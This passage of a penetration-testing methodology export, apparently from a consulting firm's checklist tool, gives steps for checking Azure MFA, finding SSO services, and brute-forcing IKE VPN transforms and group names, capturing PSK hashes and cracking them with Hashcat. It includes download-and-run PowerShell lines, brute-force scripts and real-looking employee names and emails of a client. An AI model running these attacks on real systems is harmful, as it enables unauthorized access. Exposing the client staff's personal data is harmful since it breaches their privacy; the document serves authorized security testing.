						"instructions": "<h2>Instructions</h2><p>Confirm that MFA is not required for the Azure account by using Login-AzureRmAccount to login.</p><h2>Variation: Manual</h2><p>1. Install the AzureRM powershell module.</p><pre><code>install-module azurerm</code></pre><p>2. Run the module.</p><pre><code>Login-AzureRmAccount -Verbose\nVERBOSE: Performing the operation &quot;log in&quot; on target &quot;User account in environment 'AzureCloud'&quot;.\nEnvironment           : AzureCloud\nAccount               : CAG@wingsfinancial.com\nTenantId              : 2375eba9-af99-4b2d-8eaf-7884911dde9f\nSubscriptionId        :\nSubscriptionName      :\nCurrentStorageAccount :\nPS C:\\windows\\system32&gt; get-AzureRmADUser\nUserPrincipalName                       DisplayName             Id\n-----------------                       -----------             --\n1185z9@wingsfinancialcu.onmicrosoft.com Dan N. Riley            63a5d579-2789-4396-83d5-73aa2be9a8c8\n1441@wingsfinancial.com                 Michelle Lange          fd60fdce-0181-4ef3-9b83-73e1e994fb20\n1518@wingsfinancial.com                 Abigail Sisley          f37d4217-8239-4083-931d-c2ea1e3197c1\n1596@wingsfinancial.com                 Karen Barrett           12cc630c-9f72-4828-82ea-4107d330f1a5\n1598@wingsfinancial.com                 Gail Mills              48f6b83d-e0af-44ad-9bdc-db2292ab5cc6\n1599@wingsfinancial.com                 Janet Pedersen          f2fa52c5-971e-4c88-981b-7a1c08a9b1ed\n1600@wingsfinancial.com                 Diane Weibye-Buzzell    148936ca-47ee-49eb-b916-529d8845e05e\n1603@wingsfinancial.com                 Phanta Liu              a05137f5-8a93-4da4-8fd8-94d62a095463\n1608@wingsfinancial.com                 Barb Wajda              a09dbdcc-670b-4b1c-8308-ee9c8247ba90\nget-command -module &quot;&#42;azurerm&#42;&quot;</code></pre><p>3. Inspect the ADResourceProperty</p><pre><code>PS C:\\windows\\system32&gt; Get-ADResourceProperty\nget-azureRMAdGroup</code></pre><h2>Variation: Azure CLI</h2><p>1. Install the needed tools.</p><pre><code>https://docs.microsoft.com/en-us/azure/cli-install-nodejs\nhttp://aka.ms/webpi-azure-cli\nhttps://docs.microsoft.com/en-us/azure/xplat-cli-connect</code></pre><p>2. Login to Azure</p><pre><code>azure login -u myUserName@contoso.onmicrosoft.com</code></pre><h2>Variation: Azure Portal</h2><p>1. Navigate to the Azure login portal.</p><pre><code>log into https://portal.azure.com/</code></pre><h3>Reference</h3><pre><code>https://docs.microsoft.com/en-us/rest/api/</code></pre><h2>Variation: Google Dorks</h2><p>1. In google search:</p><pre><code>inurl:adfs/ls/IdpInitiatedSignOn.aspx site: clientdomain.com\ninurl:/idp/startSSO.ping?PartnerSpId= site: clientdomain.com</code></pre><p>If you have a page come back they typically include site where federated authentication can be used.</p><h3>Reference</h3><pre><code>https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/april/introducing-azucar/</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17062400,
							"uid": "161d90c9-6083-e711-80fd-ecf4bbd04083",
							"name": "Weak Configuration - MFA Not Enabled - Azure",
							"description": "<p>The Azure configuration does not currently enforce multi-factor authentication (MFA) for all accounts.</p>",
							"severityId": 2,
							"businessImpact": "<p>If an attacker successfully guesses a Azure AD user's password they will be able to access that user's Azure resources from the internet.  This could also lead to unauthorized access to the affected user's system and connected networks.</p>",
							"sourceIdentifier": "M:161d90c9-6083-e711-80fd-ecf4bbd04083",
							"verificationInstructions": "<p>Confirm that MFA is not required for the Azure account by using Login-AzureRmAccount to login.</p><p>install-module azurerm</p><p>Login-AzureRmAccount -Verbose</p><p> VERBOSE: Performing the operation \"log in\" on target \"User account in environment 'AzureCloud'\".</p><p>Environment           : AzureCloud</p><p>Account               : CAG@wingsfinancial.com</p><p>TenantId              : 2375eba9-af99-4b2d-8eaf-7884911dde9f</p><p>SubscriptionId        : </p><p>SubscriptionName      : </p><p>CurrentStorageAccount :  </p><p>PS C:\\windows\\system32&gt; get-AzureRmADUser</p><p>UserPrincipalName                       DisplayName             Id                                  </p><p>-----------------                       -----------             --                                  </p><p>1185z9@wingsfinancialcu.onmicrosoft.com Dan N. Riley            63a5d579-2789-4396-83d5-73aa2be9a8c8</p><p>1441@wingsfinancial.com                 Michelle Lange          fd60fdce-0181-4ef3-9b83-73e1e994fb20</p><p>1518@wingsfinancial.com                 Abigail Sisley          f37d4217-8239-4083-931d-c2ea1e3197c1</p><p>1596@wingsfinancial.com                 Karen Barrett           12cc630c-9f72-4828-82ea-4107d330f1a5</p><p>1598@wingsfinancial.com                 Gail Mills              48f6b83d-e0af-44ad-9bdc-db2292ab5cc6</p><p>1599@wingsfinancial.com                 Janet Pedersen          f2fa52c5-971e-4c88-981b-7a1c08a9b1ed</p><p>1600@wingsfinancial.com                 Diane Weibye-Buzzell    148936ca-47ee-49eb-b916-529d8845e05e</p><p>1603@wingsfinancial.com                 Phanta Liu              a05137f5-8a93-4da4-8fd8-94d62a095463</p><p>1608@wingsfinancial.com                 Barb Wajda              a09dbdcc-670b-4b1c-8308-ee9c8247ba90</p><p>get-command -module \"&#42;azurerm&#42;\"</p><p> PS C:\\windows\\system32&gt; Get-ADResourceProperty </p><p>get-azureRMAdGroup</p><p>alternatively</p><p>https://docs.microsoft.com/en-us/azure/cli-install-nodejs</p><p>http://aka.ms/webpi-azure-cli</p><p>azure login</p><p>https://docs.microsoft.com/en-us/azure/xplat-cli-connect</p><p>azure login -u myUserName@contoso.onmicrosoft.com</p><p>You can also just log into the Azure portal</p><p>log into https://portal.azure.com/</p><p>https://docs.microsoft.com/en-us/rest/api/</p><p>Also you can do the following:</p><p>In google search:</p><p>inurl:adfs/ls/IdpInitiatedSignOn.aspx site: clientdomain.com</p><p>inurl:/idp/startSSO.ping?PartnerSpId= site: clientdomain.com</p><p>If you have a page come back they typically include site where federated authentication can be used.</p><p>Azure - https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/april/introducing-azucar/</p>",
							"references": "<ul><li>https://docs.microsoft.com/en-us/azure/multi-factor-authentication/multi-factor-authentication-get-started-cloud</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Configure Azure to enforce the use of Multi-Factor Authentication (MFA).  This can be done from the  Azure MFA Management Portal.</p><p>For more information visit: </p><p>https://docs.microsoft.com/en-us/azure/multi-factor-authentication/multi-factor-authentication-whats-next</p>"
						},
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "97e04cfb-f9c1-4f03-85d0-4c9a3ea4658e",
						"name": "Cloud Services - Azure - Services that Support ADFS/SSO",
						"instructions": "<h2><strong>Instructions</strong></h2><p>Identify internet facing third party applications being used by the company that accept their federated/manager domain credentials.</p><h2><strong>Variation: Unauthenticated</strong></h2><p>1. Perform google searches relate to the domains and know sso landing pages.</p><h3>Examples:</h3><pre><code>inurl:adfs/ls/IdpInitiatedSignOn.aspx site: clientdomain.com\ninurl:/idp/startSSO.ping?PartnerSpId= site: clientdomain.com</code></pre><p>2.  Review DNS TXT records for validation tokens that can indicate third part websites being used. Details can be found on in the blog at:</p><pre><code>https://blog.netspi.com/analyzing-dns-txt-records-to-fingerprint-service-providers/.</code></pre><h3>Example PowerShell Command:</h3><pre><code>&#35; Load Resolve-DnsDomainValidationToken into the PowerShell session\nIEX(New-Object System.Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/NetSPI/PowerShell/master/Resolve-DnsDomainValidationToken.ps1&quot;)\n\n&#35; Run Resolve-DnsDomainValidationToken to collect and fingerprint TXT records\n$Results = Resolve-DnsDomainValidationToken -Verbose -Domain adroll.com \n\n&#35; View records in the console\n$Results</code></pre><p>3. Conduct brute forcing of known subdomains/URL paths on third party sites. For example, slack, salesforce, servicenow, aws, sharepoint.com, etc.</p><p><strong>Note:</strong> This is an area that we need to do more research and build automation for.</p><h2><strong>Variation: Authenticated</strong></h2><p>1. Download the SPNs from azure to get a list of 3rd party size that support sso. This can be done using Microburst. Review the source code for additional instructions on how to connect to the subscription.</p><pre><code>IEX(New-Object System.Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/NetSPI/MicroBurst/2bbdeb56babe2cfabb7d10cf64b97eb55c9765c3/Az/Get-AzDomainInfo.ps1&quot;)\nGet-AzDomainInfo -folder MicroBurst -Verbose</code></pre><h3><strong>Additional Links</strong></h3><pre><code>https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2018/april/introducing-azucar/</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "76da6a0c-e228-40fe-a3cb-e3fad2321552",
						"name": "Cloud Services - Azure - Applications",
						"instructions": "<h2>Instructions</h2><p>Attempt to log into Azure with compromised credentials and visit the applications page to determine where you may have access.</p><h3>References</h3><pre><code><a href='https://account.activedirectory.windowsazure.com/r#/applications'>https://account.activedirectory.windowsazure.com/r&#35;/applications</a> </code></pre><p><strong>Note:</strong> Some of the application may suffer from Citrix style breakouts that can be leveraged to pivot into the cloud or on-premise environments.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "f5f7a98f-21db-413b-8239-81e369418d7f",
						"name": "VPN - Discover Endpoints that Accept Pre-Shared Keys",
						"instructions": "<h2><strong>Instructions</strong></h2><p>Enumerate VPN endpoints that utilize pre-shared keys (PSK).</p><h2>Variation: ike-scan</h2><p>1. Run ike-scan against all IP addresses. Any system that responds with a full handshake or &quot;Notify message 14 (NO-PROPOSAL-CHOSEN)&quot; support VPN connections.</p><ul><li><p>Full handshakes typically indicates that use of a preshared key is supported.</p></li><li><p>Notify message 14 typically indicates that the VPN server exists, but acces is restricted to specific IP addresses.</p></li></ul><p>Those systems that response with a full handshake should also be added to the VPN finding.</p><h3>Examples:</h3><pre><code><strong>ike-scan -M vpn.netspi.com</strong>\n\nStarting ike-scan 1.9.4 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n209.118.108.195 Main Mode Handshake returned\n        HDR=(CKY-R=d741e3d99130678a)\n        SA=(Enc=3DES Hash=MD5 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)\n        VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)\n\nEnding ike-scan 1.9.4: 1 hosts scanned in 0.012 seconds (81.03 hosts/sec).  1 returned handshake; 0 returned notify</code></pre><p>Below are additional command examples:</p><pre><code>ike-scan -M 1.1.1.1\nike-scan -M 192.168.1.0/24</code></pre><p>Below is a basic script to execute against a list of IP addresses.</p><pre><code>while read line; do\n        ike-scan $line\ndone &lt;  ips.txt</code></pre>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 5050824,
							"uid": "ef3a4451-0a29-e211-b92d-001e4f120032",
							"name": "Weak Configuration - VPN - Supports Pre-Shared Key",
							"description": "<p>Virtual Private Network (VPN) can be used to extend access to internal network resources over the internet via an encrypted channel. One of the protocols commonly used in VPN solutions is Internet Key Exchange (IKE).  The remote IKE service is configured with a pre-shared key. When using Aggressive Mode for shared secret authentication, IKE does not encrypt initiator or responder identities during negotiation, which may allow remote attackers to determine valid usernames.</p>",
							"severityId": -2,
							"businessImpact": "<p>Pre-shared key (PSK) and Aggressive mode could allow a remote attacker to capture and crack the PSK of a VPN gateway and gain unauthorized access to private networks.</p>",
							"sourceIdentifier": "NES:62694",
							"verificationInstructions": "<h2><strong>Verification Instructions</strong></h2><p><strong>Hack Tricks has a FANTASTIC Writeup/Walkthrough  on steps to take for UDP500 pentesting. I've tried to summarize the steps here, but definitely check out the article for more in-depth information: https://book.hacktricks.xyz/network-services-pentesting/ipsec-ike-vpn-pentesting</strong></p><p>Externally facing IKE VPNs require two valid pieces of information: </p><ol><li><p>A valid transform which tells the server what type of encryption and authentication is used in the VPN tunnel connection.</p></li><li><p>A valid group name to connect to when utilizing the IKE tunnel. </p></li></ol><p>These pieces of information can be supplied to ike-scan through the \"--id\" and \"--trans\" arguments.</p><p>In the case that the server has no default transform (Typically indicated by a Notify Message 14(NO-PROPOSAL-CHOSEN)) a valid transform will need to be brute-forced to make the connection. </p><p>In the case that the server has no default group (Typically indicated by a Notify Message 18) a group-name will need to be supplied // brute-forced if possible. </p><p><strong>IMPORTANT NOTE: SOME SERVERS WILL RETURN PSK HASHES FOR INVALID VPN GROUP IDs. IN THOSE CASES, BRUTE-FORCING OF A VALID GROUP NAME IS IMPOSSIBLE WITH JUST THE UDP 500 PORT AND IKE-SCAN. However, still report the vulnerability as with additional discovery and a valid group name, access to the PSK is still possible.</strong></p><p>1. Run ike-scan using the Aggressive Mode (-A) option against all IP addresses. Using the \"-P\" argument will return the hash for the PSK which can be nice for a proof-of-concept exploit and example for the client. Any system that responds with a full handshake or  \"Notify message 14 (NO-PROPOSAL-CHOSEN)\" should be reported. </p><p><strong>NOTE: \"--id=vpn\" is simply a placeholder, it may return a valid key, but may not be a valid group ID for the server. </strong></p><pre><code><strong>ike-scan -MA -id=vpn &lt;IP ADDRESS&gt; -P</strong>\nStarting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n66.242.65.10    Aggressive Mode Handshake returned\n        HDR=(CKY-R=544ad6d5d6aab730)\n        SA=(Enc=3DES Hash=MD5 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)\n        KeyExchange(128 bytes)\n        Nonce(20 bytes)\n        ID(Type=ID_IPV4_ADDR, Value=66.242.65.10)\n        Hash(16 bytes)\n        VID=12f5f28c457168a9702d9fe274cc0100 (Cisco Unity)\n        VID=09002689dfd6b712 (XAUTH)\n        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)\n        VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)\n        VID=1f07f70eaa6514d3b0fa96542a500100 (Cisco VPN Concentrator)\n\nIKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):\n<span style=\"color: rgb(219, 39, 25)\"><strong>32df4e44b2baa225854d76d2eb2db04843896c188aa867f69acf56a46c39167ce7138a22698344c35e1b64d7298d828c812a74ef4afafa41514fd681f8f375cdb75f760d3b2a99aec141d766c5d58481bdc01231f66e0b0e649d4c55e5be0ca019144af7757fb42a36fd937646e31028953297a328c2ccffdc24eed46d3ce2ec:abe7641c0e56fb23248bb4d312d52defad00d2d7d85cfe6c575d63703eb309e9cd51f82cbb729dc5bd2a9475218076c27ecdac7200b8fd91f28c282985d086531254ea5a6477096a088de528af047c7f540912559d7129e4154b3618d44832a23316e2507af80a96c779d9701a59ec0e75f5a072e3b217b4fad0f5d1b62be9e2:544ad6d5d6aab730:1ae3ee2fea0a8192:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:0111000042f2410a:5de2861a48346d82770607acdf425864e8cf014d:0aedcee9e02a6204255799250bd0bb7a2b67c238:f87bf1cdd1ad386d2e8b281312f50ee7</strong></span>\nEnding ike-scan 1.9: 1 hosts scanned in 0.032 seconds (31.07 hosts/sec).  1 returned handshake; 0 returned notify</code></pre><p>2. If you get Notify 14 OR the final line reads: </p><pre><code>Ending ike-scan 1.9: 1 hosts scanned in 0.032 seconds (31.07 hosts/sec).  <span style=\"color: rgb(219, 39, 25)\"><strong>0 returned handshake; 1 returned notify</strong></span></code></pre><p>You will need to brute-force the valid transform to connect to the tunnel. This can be accomplished with the following script and ike-scan:</p><p><strong>NOTE: If no results are returned from this script, it is possible that no handshake can be returned without a valid group ID name. identifying a valid group may need to be completed before this step. If so, jump to step 5.</strong></p><pre><code><strong>for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo \"--trans=$ENC,$HASH,$AUTH,$GROUP\" &gt;&gt; ike-dict.txt ;done ;done ;done ;done\n\nwhile read line; do (echo \"Valid trans found: $line\" &amp;&amp; ike-scan -M --aggressive -P handshake.txt $line &lt;IP&gt;) | grep -B7 \"SA=\" | grep \"Valid trans found\" ; done &lt; ike-dict.txt</strong></code></pre><p><strong>-OR-</strong></p><pre><code><strong>$ cat check_aggressive.sh</strong>\n#!/bin/bash\n#\n# Encryption algorithms: DES, Triple-DES, AES/128, AES/192 and AES/256\nENCLIST=\"1 5 7/128 7/192 7/256\"\n# Hash algorithms: MD5, SHA1, SHA256, SHA384, SHA512\nHASHLIST=\"1 2 5 6 7\"\n# Authentication methods: Pre-Shared Key, RSA Signatures, Hybrid Mode and XAUTH\nAUTHLIST=\"1 3 64221 65001\"\n# Diffie-Hellman groups: modp768, modp1024, modp1536, modp2048, modp3072, modp4096, modp6144, modp8192\nGROUPLIST=\"1 2 5 14 15 16 17 18\"\n#\nif [ -z $2 ]\nthen\n   echo \"[!] No group ID provided!\"\n   echo ike-scan --aggressive --pskcrack=${1}.pskcrack --multiline --id=fake-id $1\n   ike-scan --aggressive --pskcrack=${1}.pskcrack --multiline --id=fake-id $1\nelse\n   for ENC in $ENCLIST; do\n      for HASH in $HASHLIST; do\n         for AUTH in $AUTHLIST; do\n            for GROUP in $GROUPLIST; do\n               echo ike-scan --aggressive --pskcrack=${1}.pskcrack --multiline --trans=$ENC,$HASH,$AUTH,$GROUP --id=${2} $1\n               ike-scan --aggressive --pskcrack=\"${1}-${2}-${ENC//\\//_}-$HASH-$AUTH-$GROUP.pskcrack\" --multiline --trans=$ENC,$HASH,$AUTH,$GROUP --id=${2} $1\n            done\n         done\n      done\n   done\nfi\n\n\n\nExample: $./check_aggressive &lt;ip&gt; [vpn-group-name]\n$ ./check_aggressive &lt;ip&gt;\n<strong>[TRUNCATED]</strong>\nEnding ike-scan 1.9.5: 1 hosts scanned in 2.434 seconds (0.41 hosts/sec).  0 returned handshake; 0 returned notify\nike-scan --aggressive --pskcrack=128.136.252.150.pskcrack --multiline --trans=7/256,2,1,2 --id=test 128.136.252.150\nStarting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n\nEnding ike-scan 1.9.5: 1 hosts scanned in 2.434 seconds (0.41 hosts/sec).  0 returned handshake; 0 returned notify\n<strong>ike-scan --aggressive --pskcrack=128.136.252.150.pskcrack --multiline --trans=7/256,2,1,5 --id=test 128.136.252.150</strong>\nStarting ike-scan 1.9.5 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n<strong>128.136.252.150 </strong><span style=\"color: rgb(219, 39, 25)\"><strong>Aggressive Mode Handshake returned\n</strong></span><strong>        HDR=(CKY-R=a8934f93eeff82f6)\n        SA=(Enc=AES Hash=SHA1 </strong><span style=\"color: rgb(219, 39, 25)\"><strong>Auth=PSK</strong></span><strong> Group=5:modp1536 KeyLength=256 LifeType=Seconds LifeDuration(4)=0x00007080)\n        KeyExchange(192 bytes)\n        Nonce(16 bytes)\n        ID(Type=ID_IPV4_ADDR, Value=128.136.252.150)\n        Hash(20 bytes)\n        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)\n        VID=09002689dfd6b712 (XAUTH)\n        VID=8299031757a36082c6a621de00000000\n[TRUNCATED]</strong></code></pre><pre><code><strong>./check_aggressive.sh 127.0.0.1 vpn | grep -A12 -B2 \"Aggressive Mode Handshake returned\"</strong></code></pre><p>3. Reference the following chart and the results from the script to see what types of authentication are accepted on the tunnel:</p><img src=\"\" data-image-id=\"283489\"><p>4. Attempt to connect to the ike tunnel using ike-scan and provide the appropriate transform. </p><p><strong>NOTE: The SA=LINE should reflect the options provided in the transform taken from the chart above.</strong></p><pre><code><strong>ike-scan -MA -id=vpn &lt;IP ADDRESS&gt; --trans=&lt;VALID PSK TRANSFORM FROM STEP 3&gt; -P</strong>\nStarting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n66.242.65.10    Aggressive Mode Handshake returned\n        HDR=(CKY-R=544ad6d5d6aab730)\n        <span style=\"color: rgb(219, 39, 25)\"><strong>SA=(Enc=3DES Hash=MD5 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)</strong></span>\n        KeyExchange(128 bytes)\n        Nonce(20 bytes)\n        ID(Type=ID_IPV4_ADDR, Value=66.242.65.10)\n        Hash(16 bytes)\n        VID=12f5f28c457168a9702d9fe274cc0100 (Cisco Unity)\n        VID=09002689dfd6b712 (XAUTH)\n        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)\n        VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)\n        VID=1f07f70eaa6514d3b0fa96542a500100 (Cisco VPN Concentrator)\n\nIKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):\n<span style=\"color: rgb(219, 39, 25)\"><strong>32df4e44b2baa225854d76d2eb2db04843896c188aa867f69acf56a46c39167ce7138a22698344c35e1b64d7298d828c812a74ef4afafa41514fd681f8f375cdb75f760d3b2a99aec141d766c5d58481bdc01231f66e0b0e649d4c55e5be0ca019144af7757fb42a36fd937646e31028953297a328c2ccffdc24eed46d3ce2ec:abe7641c0e56fb23248bb4d312d52defad00d2d7d85cfe6c575d63703eb309e9cd51f82cbb729dc5bd2a9475218076c27ecdac7200b8fd91f28c282985d086531254ea5a6477096a088de528af047c7f540912559d7129e4154b3618d44832a23316e2507af80a96c779d9701a59ec0e75f5a072e3b217b4fad0f5d1b62be9e2:544ad6d5d6aab730:1ae3ee2fea0a8192:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:0111000042f2410a:5de2861a48346d82770607acdf425864e8cf014d:0aedcee9e02a6204255799250bd0bb7a2b67c238:f87bf1cdd1ad386d2e8b281312f50ee7</strong></span>\nEnding ike-scan 1.9: 1 hosts scanned in 0.032 seconds (31.07 hosts/sec).  1 returned handshake; 0 returned notify</code></pre><p>5. Identifying a valid group. Some servers will respond with a handshake to ANY group ID. To test for this run ike-scan with a valid transform that returns a handshake and add an obviously fake group-id in the --id argument. If no hash is returned, it is possible to brute-force the group ID, if a hash is returned, it will impossible to determine a valid group name using this method as the server is responding to any group ID. Still report this as a vulnerability, but note that a valid group-name would need to be identified before a truly valid PSK can be taken offline for cracking.</p><p><strong>Note: If the server requires a valid-transform make sure to add the \"--trans=X,X,X,X\" argument here as well.</strong></p><pre><code><strong>ike-scan -P -M -A -n ObviouslyFakeNetSPIGroupID &lt;IP&gt;</strong></code></pre><p>6. To brute-force valid group names, grab a wordlist of common group names and use ike-scan to identify valid groups. </p><p><strong>https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic</strong></p><p><strong>https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt</strong></p><pre><code>while read line; do (echo \"Found ID: $line\" &amp;&amp; sudo ike-scan -M -A -n $line &lt;IP&gt;) | grep -B14 \"1 returned handshake\" | grep \"Found ID:\"; done &lt; /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt</code></pre><p>7. If you are able to brute-force a valid group, a valid transform and have the PSK Hash, you can take the PSK hash recovered using ike-scan and attempt to crack it with Hashcat using the following hashtypes.</p><p><strong>NOTE: With a cracked PSK and a valid set of user credentials, access to the VPN would now be possible. </strong></p><pre><code> 5300 = IKE-PSK MD5\n 5400 = IKE-PSK SHA1</code></pre><h2><strong><u>NOTE:</u></strong></h2><p>If anyone has a better way to get the group name, please add it here.</p><p>1. Try to connect to the remote host with Cisco AnyConnect. If successful, the group names should appear in the Drop-down list</p><p>2 For each group name, get the PSK with ike-scan. </p><pre><code>ike-scan -M -A --id &lt;groupname&gt; &lt;IP&gt; -P&lt;IP&gt;.key</code></pre><p>Results should look like this (notice the Encryption):</p><pre><code> HDR=(CKY-R=5a896929892925e1)\n        SA=(Enc=<span style=\"color: rgb(255, 171, 0)\"><strong>3DES Hash</strong></span>=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)\n        KeyExchange(128 bytes)\n        Nonce(20 bytes)\n        ID(Type=ID_IPV4_ADDR, Value=216.160.42.150)\n        Hash(20 bytes)\n        VID=12f5f28c457168a9702d9fe274cc0100 (Cisco Unity)\n        VID=09002689dfd6b712 (XAUTH)\n        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)\n        VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)\n        VID=1f07f70eaa6514d3b0fa96542a500100 (Cisco VPN Concentrator)</code></pre><p><strong>Another Example (Non-CISCO):</strong></p><p><strong>NOTE: Change the idtype if you're not getting anything back</strong></p><pre><code>ike-scan 66.147.13.42 -M -A -P <strong>--idtype=1   </strong>\nStarting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)\n66.147.13.42\tAggressive Mode Handshake returned\n\tHDR=(CKY-R=41433f4580a79c83)\n\tSA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)\n\tKeyExchange(128 bytes)\n\tNonce(20 bytes)\n\tID(Type=ID_FQDN, Value=HMR-FW1)\n\tVID=404bf439522ca3f6 (SonicWall)\n\tVID=5b362bc820f60007\n\tHash(20 bytes)\n\nIKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):\n6e1a617f956fd8ac021ebf9c229b2cc3eab332c589ff7f383483489f34c139e1ba394e42dda4e75b8bab1844d612b5f183b43ec46ae1bf2f2a70cfd086bfdbd79163ffe878725905d169c6b60de9c8170dfc45ae8949216be8b0ba097adf2a45515c55b36e6bc8324088430b6527852f0f661a78672da7a786249e7a5e50d0ee:ee6d687f43b2c497cde6bec1bab3dd472ba3fd1627226deea1ee7e3f69a4cb4cdfdd59eb2e200a25749b19b7f9f90039df8b57a45cef9af6e30dbcb22b842454ad457a4776d128d20a3d700c4eba1b18b80c9996e7a487c04ff04e49c1ebc566336abd1638cbb97e57fa415be0eb57b1ef067b43a8efec71f68c08a17b7823e5:41433f4580a79c83:68dcb4f1108cae82:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:02000000484d522d465731:2da494a2c8a94a3799fc2436f487b495d06b3c77:eab91cad1ecb2b782ee8cdf8595c3717a9177c7c:51d571fc77b6b495aa6a13d75de268b5ff5a3b9f\nEnding ike-scan 1.9: 1 hosts scanned in 0.067 seconds (14.87 hosts/sec).  1 returned handshake; 0 returned notify</code></pre><p><strong>Another Example (SonicWall device):</strong></p><p>Use group name <code>GroupVPN</code> to get responses back</p><p><strong><u>Other Useful Links:</u></strong></p><p>https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/cracking-ike-missionimprobable-part-1/</p><p>http://carnal0wnage.attackresearch.com/2011/12/aggressive-mode-vpn-ike-scan-psk-crack.html</p>",
							"references": "<ul><li>http://www.nta-monitor.com/wiki/index.php/Ike-scan_User_Guide</li></ul>",
							"exploitInstructions": "<p>This procedure should provide a valid group name and password that can be used to VPN in.</p><p>1.) Verify access to service and aggressive mode.  Open Kali vm and issue the command below. It should return a valid response.</p><p>ike-scan 192.168.1.2 -M -A --id=invalidgroupid</p><p>2.) Brute force group name.  </p><p>#Cisco group name enumeration</p><p>It can be downloaded from  https://github.com/SpiderLabs/groupenum.  It should be copied to the backtrack distro to run.  It depends on python and ike-scan.  Note that this could potentially cause denial of service conditions so be careful.</p><p>python groupenum.py -t 192.168.1.2  -w wordlist.txt -s MD5</p><p>#Manual group name enumeration - This can also be done with the dead peer detection (DPD) note at http://blog.spiderlabs.com/2013/03/cracking-ike-aggressive-mode-hashes-part-1.html</p><p>Example 1:</p><p>Request using invalid group name</p><p>ike-scan 10.70.70.25 -M -A --id=incorrectgroup</p><p>Response using invalid group name</p><p>13:22:59.929273 IP 10.70.70.204.isakmp > 10.70.70.25.isakmp: isakmp: phase 1 I agg</p><p>13:22:59.932624 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp: isakmp: phase 1 R agg</p><p>13:23:05.696571 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp: isakmp: phase 1 R agg</p><p>Example 2:</p><p>Request using valid group name</p><p>ike-scan 10.70.70.25 -M -A --id=correctgroup</p><p>Response using valid group name</p><p>13:23:05.693673 IP 10.70.70.204.isakmp > 10.70.70.25.isakmp: isakmp: phase 1 I agg</p><p>13:23:13.690392 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp: isakmp: phase 1 R agg</p><p>13:23:21.690464 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp: isakmp: phase 1 R agg</p><p>13:23:29.690528 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp: isakmp: phase 1 R agg</p><p>13:23:37.691275 IP 10.70.70.25.isakmp > 10.70.70.204.isakmp: isakmp: phase 2/others R inf[E]</p><p>This 